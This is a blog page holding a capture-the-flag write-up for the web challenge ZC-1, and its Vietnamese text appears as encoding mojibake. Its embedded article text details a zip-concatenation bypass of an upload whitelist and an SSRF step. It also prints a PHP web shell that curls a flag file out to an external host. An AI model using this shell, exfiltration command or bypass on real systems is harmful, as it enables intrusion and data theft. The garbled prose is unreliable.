<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CSCV2025 | Web | ZC-1 | Blog</title>
<meta name="keywords" content="web">
<meta name="description" content="âš”ï¸ ZC-1

Category: Web
Difficulty: _
Author: _
Description: _
Resource: _


ğŸ›°ï¸Recon
Tá»•ng quan chung:
Challenge bao gá»“m 2 á»©ng dá»¥ng web vá»›i:

app1 lÃ  á»©ng dá»¥ng web Python cho phÃ©p Ä‘Äƒng kÃ­, Ä‘Äƒng nháº­p, vÃ  upload file zip, á»©ng dá»¥ng Ä‘Æ°á»£c expose vá»›i port 8080
app2 lÃ  á»©ng dá»¥ng web Php phá»¥c vá»¥ cho viá»‡c giáº£i nÃ©n lÃ  lÆ°u trá»¯ cÃ¡c file vá»«a upload, á»©ng dá»¥ng khÃ´ng thá»ƒ truy cáº­p tá»« bÃªn ngoÃ i mÃ  chá»‰ cÃ³ thá»ƒ thÃ´ng qua app1 hoáº·c tá»« bÃªn trong

Chi tiáº¿t
App1
á»¨ng dá»¥ng bao gá»“m cÃ¡c endpoint sau (bá» qua má»™t sá»‘ chi tiáº¿t khÃ´ng quan trá»ng):">
<meta name="author" content="">
<link rel="canonical" href="http://localhost:1313/ctf/cscv_2025/zc-1/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.a482bf00fa5c046040ef7973ad5fdf5657890cacb596c93f1382f664ca542074.css" integrity="sha256-pIK/APpcBGBA73lzrV/fVleJDKy1lsk/E4L2ZMpUIHQ=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/ctf/cscv_2025/zc-1/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="http://localhost:1313/ctf/cscv_2025/zc-1/">
  <meta property="og:site_name" content="Blog">
  <meta property="og:title" content="CSCV2025 | Web | ZC-1">
  <meta property="og:description" content="âš”ï¸ ZC-1 Category: Web Difficulty: _ Author: _ Description: _ Resource: _ ğŸ›°ï¸Recon Tá»•ng quan chung: Challenge bao gá»“m 2 á»©ng dá»¥ng web vá»›i:
app1 lÃ  á»©ng dá»¥ng web Python cho phÃ©p Ä‘Äƒng kÃ­, Ä‘Äƒng nháº­p, vÃ  upload file zip, á»©ng dá»¥ng Ä‘Æ°á»£c expose vá»›i port 8080 app2 lÃ  á»©ng dá»¥ng web Php phá»¥c vá»¥ cho viá»‡c giáº£i nÃ©n lÃ  lÆ°u trá»¯ cÃ¡c file vá»«a upload, á»©ng dá»¥ng khÃ´ng thá»ƒ truy cáº­p tá»« bÃªn ngoÃ i mÃ  chá»‰ cÃ³ thá»ƒ thÃ´ng qua app1 hoáº·c tá»« bÃªn trong Chi tiáº¿t App1 á»¨ng dá»¥ng bao gá»“m cÃ¡c endpoint sau (bá» qua má»™t sá»‘ chi tiáº¿t khÃ´ng quan trá»ng):">
  <meta property="og:locale" content="vi-vn">
  <meta property="og:type" content="article">
    <meta property="article:section" content="ctf">
    <meta property="article:published_time" content="2025-10-20T00:00:00+07:00">
    <meta property="article:modified_time" content="2025-10-20T00:00:00+07:00">
    <meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CSCV2025 | Web | ZC-1">
<meta name="twitter:description" content="âš”ï¸ ZC-1

Category: Web
Difficulty: _
Author: _
Description: _
Resource: _


ğŸ›°ï¸Recon
Tá»•ng quan chung:
Challenge bao gá»“m 2 á»©ng dá»¥ng web vá»›i:

app1 lÃ  á»©ng dá»¥ng web Python cho phÃ©p Ä‘Äƒng kÃ­, Ä‘Äƒng nháº­p, vÃ  upload file zip, á»©ng dá»¥ng Ä‘Æ°á»£c expose vá»›i port 8080
app2 lÃ  á»©ng dá»¥ng web Php phá»¥c vá»¥ cho viá»‡c giáº£i nÃ©n lÃ  lÆ°u trá»¯ cÃ¡c file vá»«a upload, á»©ng dá»¥ng khÃ´ng thá»ƒ truy cáº­p tá»« bÃªn ngoÃ i mÃ  chá»‰ cÃ³ thá»ƒ thÃ´ng qua app1 hoáº·c tá»« bÃªn trong

Chi tiáº¿t
App1
á»¨ng dá»¥ng bao gá»“m cÃ¡c endpoint sau (bá» qua má»™t sá»‘ chi tiáº¿t khÃ´ng quan trá»ng):">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Capture The Flag",
      "item": "http://localhost:1313/ctf/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CSCV 2025",
      "item": "http://localhost:1313/ctf/cscv_2025/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "CSCV2025 | Web | ZC-1",
      "item": "http://localhost:1313/ctf/cscv_2025/zc-1/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CSCV2025 | Web | ZC-1",
  "name": "CSCV2025 | Web | ZC-1",
  "description": "âš”ï¸ ZC-1 Category: Web Difficulty: _ Author: _ Description: _ Resource: _ ğŸ›°ï¸Recon Tá»•ng quan chung: Challenge bao gá»“m 2 á»©ng dá»¥ng web vá»›i:\napp1 lÃ  á»©ng dá»¥ng web Python cho phÃ©p Ä‘Äƒng kÃ­, Ä‘Äƒng nháº­p, vÃ  upload file zip, á»©ng dá»¥ng Ä‘Æ°á»£c expose vá»›i port 8080 app2 lÃ  á»©ng dá»¥ng web Php phá»¥c vá»¥ cho viá»‡c giáº£i nÃ©n lÃ  lÆ°u trá»¯ cÃ¡c file vá»«a upload, á»©ng dá»¥ng khÃ´ng thá»ƒ truy cáº­p tá»« bÃªn ngoÃ i mÃ  chá»‰ cÃ³ thá»ƒ thÃ´ng qua app1 hoáº·c tá»« bÃªn trong Chi tiáº¿t App1 á»¨ng dá»¥ng bao gá»“m cÃ¡c endpoint sau (bá» qua má»™t sá»‘ chi tiáº¿t khÃ´ng quan trá»ng):\n",
  "keywords": [
    "web"
  ],
  "articleBody": "âš”ï¸ ZC-1 Category: Web Difficulty: _ Author: _ Description: _ Resource: _ ğŸ›°ï¸Recon Tá»•ng quan chung: Challenge bao gá»“m 2 á»©ng dá»¥ng web vá»›i:\napp1 lÃ  á»©ng dá»¥ng web Python cho phÃ©p Ä‘Äƒng kÃ­, Ä‘Äƒng nháº­p, vÃ  upload file zip, á»©ng dá»¥ng Ä‘Æ°á»£c expose vá»›i port 8080 app2 lÃ  á»©ng dá»¥ng web Php phá»¥c vá»¥ cho viá»‡c giáº£i nÃ©n lÃ  lÆ°u trá»¯ cÃ¡c file vá»«a upload, á»©ng dá»¥ng khÃ´ng thá»ƒ truy cáº­p tá»« bÃªn ngoÃ i mÃ  chá»‰ cÃ³ thá»ƒ thÃ´ng qua app1 hoáº·c tá»« bÃªn trong Chi tiáº¿t App1 á»¨ng dá»¥ng bao gá»“m cÃ¡c endpoint sau (bá» qua má»™t sá»‘ chi tiáº¿t khÃ´ng quan trá»ng):\nPOST /gateway/user : cho phÃ©p ngÆ°á»i Ä‘Äƒng kÃ­ vá»›i cÃ¡c trÆ°á»ng username, password POST /gateway/transport : cho phÃ©p ngÆ°á»i dÃ¹ng Ä‘Ã£ xÃ¡c thá»±c upload file zip Endpoint nÃ y sá»­ dá»¥ng thÆ° viá»‡n zipfile trong python Ä‘á»ƒ thá»±c hiá»‡n kiá»ƒm tra file extension cá»§a cÃ¡c file entry trong file zip Ä‘Æ°á»£c upload dá»±a trÃªn whilelist trÆ°á»›c khi gá»­i nÃ³ Ä‘áº¿n endpoint upload.php cá»§a app2 GET /gateway/health : nháº­n vÃ o param module cho phÃ©p ngÆ°á»i dÃ¹ng kiá»ƒm tra hoáº¡t Ä‘á»™ng cá»§a cÃ¡c endpoint táº¡i app2 POST auth/token : thá»±c hiá»‡n xÃ¡c thá»±c ngÆ°á»i dÃ¹ng vá»›i username vÃ  password, tráº£ vá»ƒ session token (sá»­ dá»¥ng cho viá»‡c xÃ¡c thá»±c) vÃ  refresh token App2 á»¨ng dá»¥ng bao gá»“m cÃ¡c endpoint sau\nPOST upload.php: cho phÃ©p upload file zip (tá»« app1) vÃ  thá»±c hiá»‡n giáº£i nÃ©n file zip vÃ  lÆ°u cÃ¡c file sau khi Ä‘Ã£ giáº£i nÃ©n trong folder upload/ health.php: má»™t file rá»—ng chá»‰ nháº±m má»¥c Ä‘Ã­ch kiá»ƒm tra káº¿t ná»‘i, hoáº¡t Ä‘á»™ng cá»§a app2 ğŸ§ª Dig \u0026 Analyze Dá»±a trÃªn cáº¥u trÃºc cá»§a challenge, há»‡ thá»‘ng cho phÃ©p upload file zip sau Ä‘Ã³ thá»±c hiá»‡n giáº£i nÃ©n vÃ  lÆ°u trá»¯ cÃ¡c file entry trong á»©ng dá»¥ng web Php (thÆ° má»¥c lÆ°u trá»¯ file khÃ´ng cÃ³ cáº¥u hÃ¬nh Ä‘á»ƒ ngÄƒn viá»‡c thá»±c thi file .php). Váº­y má»¥c tiÃªu challenge á»Ÿ Ä‘Ã¢y kháº£ nÄƒng cao lÃ  upload web shell thÃ´ng qua viá»‡c upload file zip chá»©a file entry nguy hiá»ƒm.\nDá»±a trÃªn má»¥c tiÃªu trÃªn, cÃ³ 2 váº¥n Ä‘á» cáº§n giáº£i quyáº¿t:\n1. LÃ m tháº¿ nÃ o Ä‘á»ƒ bypass Ä‘Æ°á»£c file extension check á»Ÿ app1 -\u003e Zip Concatenation Trong khi app1 thá»±c hiá»‡n kiá»ƒm tra file zip upload vá»›i thÆ° viá»‡n zipfile thÃ¬ app2 láº¡i sá»­ dá»¥ng Archive7z\\Archive7z hay cÃ´ng cá»¥ 7z Ä‘á»ƒ thá»±c hiá»‡n giáº£i nÃ©n file zip.\nBáº¡n cÃ³ thá»ƒ chá»§ Ä‘á»™ng tÃ¬m hiá»ƒu thÃªm vá» cáº¥u trÃºc file zip Ä‘á»ƒ hiá»ƒu rÃµ hÆ¡n bÃ i wriuteup, bÃ i wriueup khÃ´ng Ä‘i sÃ¢u vÃ o phÃ¢n tÃ­ch cáº¥u trÃºc file zip hay giáº£i thÃ­ch cá»¥ thá»ƒ vá» lá»— há»•ng zip concatenation\nÄi vÃ o chi tiáº¿t hÆ¡n cÃ¡ch mÃ  2 trÃ¬nh zip parser nÃ y hoáº¡t Ä‘á»™ng:\nÄá»‘i vá»›i python zipfile, trÃ¬nh Ä‘á»c zip nÃ y khÃ´ng báº¯t Ä‘áº§u Ä‘á»c tá»« Ä‘áº§u tá»‡p mÃ  thay vÃ o Ä‘Ã³, nÃ³ quÃ©t ngÆ°á»£c tá»« cuá»‘i file Ä‘á»ƒ tÃ¬m kiáº¿m láº§n lÆ°á»£t End of Central Directory, Central Directory, file entry dá»±a trÃªn offset. Äá»‘i vá»›i 7z, Ä‘á»‹nh dáº¡ng nÃ y Ä‘áº·t signature vÃ  cÃ¡c header cá»§a nÃ³ á»Ÿ Ä‘áº§u tá»‡p. CÃ´ng cá»¥ 7z báº¯t Ä‘áº§u phÃ¢n tÃ­ch file zip tá»« Ä‘áº§u tá»‡p (offset = 0) -\u003e Äiá»ƒm khÃ´ng Ä‘á»“ng nháº¥t á»Ÿ Ä‘Ã¢y cÃ¹ng vá»›i hÃ¬nh áº£nh mÃ´ táº£ cá»§a challenge gá»£i cho tÃ´i Ã½ tÆ°á»Ÿng vá» viá»‡c táº­n dá»¥ng Ä‘iá»ƒm khÃ¡c biá»‡t cá»§a 2 trÃ¬nh zip parser Ä‘á»ƒ táº¡o má»™t file zip há»£p lá»‡ vá»›i cáº£ 2 trÃ¬nh parser tuy nhiÃªn ná»™i dung Ä‘á»c Ä‘Æ°á»£c cá»§a chÃºng láº¡i khÃ¡c nhau bá»Ÿi cÆ¡ cháº¿ phÃ¢n tÃ­ch cá»§a chÃºng khÃ¡c nhau.\nTÃ¬m hiá»ƒu thÃªm má»™t vÃ i kÄ© thuáº­t táº¥n cÃ´ng liÃªn quan Ä‘áº¿n Ä‘á»‹nh dáº¡ng file Zip tÃ´i tÃ¬m Ä‘Æ°á»£c kÄ© thuáº­t Zip Concatenation phÃ¹ há»£p vá»›i tÃ¬nh huá»‘ng lá»— há»•ng nÃ y\n2. LÃ m tháº¿ nÃ o Ä‘á»ƒ cÃ³ thá»ƒ thá»±c thi file php náº¿u Ä‘Ã£ upload Ä‘Æ°á»£c thÃ nh cÃ´ng -\u003e SSRF á»¨ng dá»¥ng app1 cho phÃ©p kiá»ƒm tra hoáº¡t Ä‘á»™ng cá»§a backend táº¡i endpoint GET /gateway/health. Endpoint nÃ y nháº­n vÃ o params module, input nÃ y Ä‘Æ°á»£c ná»‘i chuá»—i vÃ o storage_url mÃ  khÃ´ng qua kiá»ƒm tra sÃ ng lá»c dáº«n Ä‘áº¿n cÃ³ thá»ƒ khai thÃ¡c SSRF á»Ÿ Ä‘Ã¢y Ä‘á»ƒ gá»i Ä‘áº¿n file php Ä‘Æ°á»£c upload -\u003e Thá»±c thi thÃ nh cÃ´ng file .php ğŸ”¥ Exploit Táº¡o payload Táº¡o file zip an toÃ n chá»©a cÃ¡c file entry phÃ¹ há»£p vá»›i whitelist cá»§a challenge echo helloworld \u003e user.txt zip user.zip user.txt \u003e/dev/null Táº¡o 7z archive chá»©a web shell echo '\u003c?php system(\"curl https://w4zhdt6e.requestrepo.com/ -F \\\"file=@/flag.txt\\\"\") ?\u003e' \u003e shell.php 7z a -t7z evil.7z shell.php \u003e/dev/null File nÃ y cÃ³ kÃ­ch thÆ°á»›c lÃ  207 bytes (0xCF bytes)\nChá»‰nh sá»­a payload sao cho há»£p lá»‡ vá»›i zipfile ChÃºng ta sáº½ thá»±c hiá»‡n ná»‘i 2 file Ä‘Æ¡n giáº£n báº±ng viá»‡c sá»­ dá»¥ng lá»‡nh cat\ncat evil.zip user.zip \u003e zipconcat.zip Tuy nhiÃªn file zip nÃ y chÆ°a há»£p lá»‡ bá»Ÿi viá»‡c thÃªm trÆ°á»›c file zip má»™t file 7z sáº½ khiáº¿n offset cá»§a pháº§n user.zip bá»‹ thay Ä‘á»•i, do Ä‘Ã³ cáº§n thá»±c hiá»‡n chá»‰nh sá»­a offset sao cho payload nÃ y há»£p lá»‡ vá»›i zipfile\nCÃ¡c 2 vá»‹ trÃ­ offset cáº§n thay Ä‘á»•i (9D bá»Ÿi thÃªm vÃ o trÆ°á»›c file nÃ y 0x9D bytes) lÃ :\noffset tá»›i Central Directory: náº±m trong pháº§n End of Centrol directory cÃ³ giÃ¡ trá»‹ lÃ  4D chá»‰nh sá»­a thÃ nh 11C = 4D + CF offset tá»›i Local file Header náº±m táº¡i offset 42 tÃ¬nh tá»« Ä‘áº§u má»—i Central Directory cÃ³ giÃ¡ trá»‹ lÃ  00 chá»‰nh sá»­a thÃ nh CF = 00 + CF Trá»±c tiáº¿p thay Ä‘á»•i offset báº±ng viá»‡c sá»­ dá»¥ng hex editor\ncat evil.7z user.zip \u003e zipconcat.zip Kiá»ƒm tra file vá»›i python zipfile Kiá»ƒm tra file zip vá»›i 7z VÃ¬ táº­p lá»‡nh Ä‘áº·t tá»‡p lÆ°u trá»¯ 7z á»Ÿ ngay Ä‘áº§u tá»‡p Ä‘Æ°á»£c káº¿t há»£p, nÃªn cÃ¡c cÃ´ng cá»¥ 7z sáº½ coi tá»‡p Ä‘Æ°á»£c káº¿t há»£p nhÆ° má»™t tá»‡p lÆ°u trá»¯ 7z bÃ¬nh thÆ°á»ng vÃ  trÃ­ch xuáº¥t ná»™i dung 7z (tá»‡p PHP trong vÃ­ dá»¥ cá»§a báº¡n) mÃ  khÃ´ng cáº§n Ä‘á»™ng Ä‘áº¿n cÃ¡c cáº¥u trÃºc ZIP Ä‘Æ°á»£c thÃªm vÃ o phÃ­a dÆ°á»›i Máº·c dÃ¹ cÃ³ thÃ´ng bÃ¡o lá»—i bá»Ÿi 7z phÃ¡t hiá»‡n cÃ²n cÃ¡c bytes á»Ÿ cuá»‘i file nhÆ°ng payload váº«n Ä‘Æ°á»£c giáº£i nÃ©n thÃ nh cÃ´ng Thá»±c hiá»‡n táº¥n cÃ´ng Táº¡o tÃ i khoÃ n ngÆ°á»i dÃ¹ng vÃ  láº¥y Authorization token (JWT):\nThá»±c hiá»‡n upload file payload vá»«a táº¡o vá»›i Authorization header chá»©a token vá»«a láº¥y Ä‘Æ°á»£c\nThá»±c hiá»‡n SSRF thá»ƒ thá»±c thi file php Ä‘Ã£ upload, tuy nhiÃªn cáº§n xÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c vá»‹ trÃ­ cá»§a file trÃªn server\nFile sau khi extract Ä‘Æ°á»£c lÆ°u táº¡i thÆ° má»¥c upload/, chÃºng ta cÃ³ thá»ƒ dá»… dÃ ng tÃ¬m Ä‘Æ°á»£c user id trong JWT token\nThá»±c hiá»‡n SSRF\nMáº·c dÃ¹ request tráº£ vá» â€œERRâ€ nhÆ°ng chÃºng ta váº«n thÃ nh cÃ´ng láº¥y Ä‘Æ°á»£c flag\nğŸ† EXP -\u003e Zip Concatenation\n",
  "wordCount" : "1107",
  "inLanguage": "en",
  "datePublished": "2025-10-20T00:00:00+07:00",
  "dateModified": "2025-10-20T00:00:00+07:00",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/ctf/cscv_2025/zc-1/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Blog (Alt + H)">Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/ctf/" title="CTF Writeups">
                    <span>CTF Writeups</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/hackthebox/" title="Hackthebox">
                    <span>Hackthebox</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/research/" title="Research/Sharing">
                    <span>Research/Sharing</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/about/" title="About">
                    <span>About</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;Â»&nbsp;<a href="http://localhost:1313/ctf/">Capture The Flag</a>&nbsp;Â»&nbsp;<a href="http://localhost:1313/ctf/cscv_2025/">CSCV 2025</a></div>
    <h1 class="post-title entry-hint-parent">
      CSCV2025 | Web | ZC-1
    </h1>
    <div class="post-meta"><span title='2025-10-20 00:00:00 +0700 +07'>October 20, 2025</span>&nbsp;Â·&nbsp;<span>6 min</span>

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#-zc-1" aria-label="âš”ï¸ ZC-1">âš”ï¸ ZC-1</a></li>
                <li>
                    <a href="#recon" aria-label="ğŸ›°ï¸Recon">ğŸ›°ï¸Recon</a><ul>
                        
                <li>
                    <a href="#t%e1%bb%95ng-quan-chung" aria-label="Tá»•ng quan chung:">Tá»•ng quan chung:</a></li>
                <li>
                    <a href="#chi-ti%e1%ba%bft" aria-label="Chi tiáº¿t">Chi tiáº¿t</a><ul>
                        
                <li>
                    <a href="#app1" aria-label="App1">App1</a></li>
                <li>
                    <a href="#app2" aria-label="App2">App2</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#-dig--analyze" aria-label="ğŸ§ª Dig &amp; Analyze">ğŸ§ª Dig &amp; Analyze</a><ul>
                        
                <li>
                    <a href="#1-l%c3%a0m-th%e1%ba%bf-n%c3%a0o-%c4%91%e1%bb%83-bypass-%c4%91%c6%b0%e1%bb%a3c-file-extension-check-%e1%bb%9f-app1---zip-concatenation" aria-label="1. LÃ m tháº¿ nÃ o Ä‘á»ƒ bypass Ä‘Æ°á»£c file extension check á»Ÿ app1 -&gt; Zip Concatenation">1. LÃ m tháº¿ nÃ o Ä‘á»ƒ bypass Ä‘Æ°á»£c file extension check á»Ÿ app1 -&gt; Zip Concatenation</a></li>
                <li>
                    <a href="#2-l%c3%a0m-th%e1%ba%bf-n%c3%a0o-%c4%91%e1%bb%83-c%c3%b3-th%e1%bb%83-th%e1%bb%b1c-thi-file-php-n%e1%ba%bfu-%c4%91%c3%a3-upload-%c4%91%c6%b0%e1%bb%a3c-th%c3%a0nh-c%c3%b4ng---ssrf" aria-label="2. LÃ m tháº¿ nÃ o Ä‘á»ƒ cÃ³ thá»ƒ thá»±c thi file php náº¿u Ä‘Ã£ upload Ä‘Æ°á»£c thÃ nh cÃ´ng -&gt; SSRF">2. LÃ m tháº¿ nÃ o Ä‘á»ƒ cÃ³ thá»ƒ thá»±c thi file php náº¿u Ä‘Ã£ upload Ä‘Æ°á»£c thÃ nh cÃ´ng -&gt; SSRF</a></li></ul>
                </li>
                <li>
                    <a href="#-exploit" aria-label="ğŸ”¥ Exploit">ğŸ”¥ Exploit</a><ul>
                        
                <li>
                    <a href="#t%e1%ba%a1o-payload" aria-label="Táº¡o payload">Táº¡o payload</a></li>
                <li>
                    <a href="#th%e1%bb%b1c-hi%e1%bb%87n-t%e1%ba%a5n-c%c3%b4ng" aria-label="Thá»±c hiá»‡n táº¥n cÃ´ng">Thá»±c hiá»‡n táº¥n cÃ´ng</a></li></ul>
                </li>
                <li>
                    <a href="#-exp" aria-label="ğŸ† EXP">ğŸ† EXP</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="-zc-1">âš”ï¸ ZC-1<a hidden class="anchor" aria-hidden="true" href="#-zc-1">#</a></h1>
<ul>
<li><strong>Category:</strong> Web</li>
<li><strong>Difficulty:</strong> _</li>
<li><strong>Author:</strong> _</li>
<li><strong>Description</strong>: _</li>
<li><strong>Resource</strong>: _</li>
</ul>
<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/S1omJ7XAex.png"></p>
<h1 id="recon">ğŸ›°ï¸Recon<a hidden class="anchor" aria-hidden="true" href="#recon">#</a></h1>
<h2 id="tá»•ng-quan-chung">Tá»•ng quan chung:<a hidden class="anchor" aria-hidden="true" href="#tá»•ng-quan-chung">#</a></h2>
<p>Challenge bao gá»“m 2 á»©ng dá»¥ng web vá»›i:</p>
<ul>
<li>app1 lÃ  á»©ng dá»¥ng web Python cho phÃ©p Ä‘Äƒng kÃ­, Ä‘Äƒng nháº­p, vÃ  upload file zip, á»©ng dá»¥ng Ä‘Æ°á»£c expose vá»›i port 8080</li>
<li>app2 lÃ  á»©ng dá»¥ng web Php phá»¥c vá»¥ cho viá»‡c giáº£i nÃ©n lÃ  lÆ°u trá»¯ cÃ¡c file vá»«a upload, á»©ng dá»¥ng khÃ´ng thá»ƒ truy cáº­p tá»« bÃªn ngoÃ i mÃ  chá»‰ cÃ³ thá»ƒ thÃ´ng qua app1 hoáº·c tá»« bÃªn trong</li>
</ul>
<h2 id="chi-tiáº¿t">Chi tiáº¿t<a hidden class="anchor" aria-hidden="true" href="#chi-tiáº¿t">#</a></h2>
<h3 id="app1">App1<a hidden class="anchor" aria-hidden="true" href="#app1">#</a></h3>
<p>á»¨ng dá»¥ng bao gá»“m cÃ¡c endpoint sau (bá» qua má»™t sá»‘ chi tiáº¿t khÃ´ng quan trá»ng):</p>
<ul>
<li>POST <code>/gateway/user</code> : cho phÃ©p ngÆ°á»i Ä‘Äƒng kÃ­ vá»›i cÃ¡c trÆ°á»ng username, password</li>
<li>POST <code>/gateway/transport</code> : cho phÃ©p ngÆ°á»i dÃ¹ng Ä‘Ã£ xÃ¡c thá»±c upload file zip
<ul>
<li>Endpoint nÃ y sá»­ dá»¥ng thÆ° viá»‡n <code>zipfile</code> trong python Ä‘á»ƒ thá»±c hiá»‡n kiá»ƒm tra file extension cá»§a cÃ¡c file entry trong file zip Ä‘Æ°á»£c upload dá»±a trÃªn whilelist trÆ°á»›c khi gá»­i nÃ³ Ä‘áº¿n endpoint <code>upload.php</code> cá»§a app2</li>
</ul>
</li>
<li>GET <code>/gateway/health</code> : nháº­n vÃ o param <code>module</code> cho phÃ©p ngÆ°á»i dÃ¹ng kiá»ƒm tra hoáº¡t Ä‘á»™ng cá»§a cÃ¡c endpoint táº¡i app2</li>
<li>POST <code>auth/token</code> : thá»±c hiá»‡n xÃ¡c thá»±c ngÆ°á»i dÃ¹ng vá»›i username vÃ  password, tráº£ vá»ƒ session token (sá»­ dá»¥ng cho viá»‡c xÃ¡c thá»±c) vÃ  refresh token</li>
</ul>
<h3 id="app2">App2<a hidden class="anchor" aria-hidden="true" href="#app2">#</a></h3>
<p>á»¨ng dá»¥ng bao gá»“m cÃ¡c endpoint sau</p>
<ul>
<li>POST <code>upload.php</code>: cho phÃ©p upload file zip (tá»« app1) vÃ  thá»±c hiá»‡n giáº£i nÃ©n file zip vÃ  lÆ°u cÃ¡c file sau khi Ä‘Ã£ giáº£i nÃ©n trong folder <code>upload/&lt;user_id&gt;</code></li>
<li><code>health.php</code>: má»™t file rá»—ng chá»‰ nháº±m má»¥c Ä‘Ã­ch kiá»ƒm tra káº¿t ná»‘i, hoáº¡t Ä‘á»™ng cá»§a app2</li>
</ul>
<h1 id="-dig--analyze">ğŸ§ª Dig &amp; Analyze<a hidden class="anchor" aria-hidden="true" href="#-dig--analyze">#</a></h1>
<p>Dá»±a trÃªn cáº¥u trÃºc cá»§a challenge, há»‡ thá»‘ng cho phÃ©p upload file zip sau Ä‘Ã³ thá»±c hiá»‡n giáº£i nÃ©n vÃ  lÆ°u trá»¯ cÃ¡c file entry trong á»©ng dá»¥ng web Php (thÆ° má»¥c lÆ°u trá»¯ file khÃ´ng cÃ³ cáº¥u hÃ¬nh Ä‘á»ƒ ngÄƒn viá»‡c thá»±c thi file .php). Váº­y má»¥c tiÃªu challenge á»Ÿ Ä‘Ã¢y kháº£ nÄƒng cao lÃ  upload web shell thÃ´ng qua viá»‡c upload file zip chá»©a file entry nguy hiá»ƒm.</p>
<p>Dá»±a trÃªn má»¥c tiÃªu trÃªn, cÃ³ 2 váº¥n Ä‘á» cáº§n giáº£i quyáº¿t:</p>
<h2 id="1-lÃ m-tháº¿-nÃ o-Ä‘á»ƒ-bypass-Ä‘Æ°á»£c-file-extension-check-á»Ÿ-app1---zip-concatenation">1. LÃ m tháº¿ nÃ o Ä‘á»ƒ bypass Ä‘Æ°á»£c file extension check á»Ÿ app1 -&gt; Zip Concatenation<a hidden class="anchor" aria-hidden="true" href="#1-lÃ m-tháº¿-nÃ o-Ä‘á»ƒ-bypass-Ä‘Æ°á»£c-file-extension-check-á»Ÿ-app1---zip-concatenation">#</a></h2>
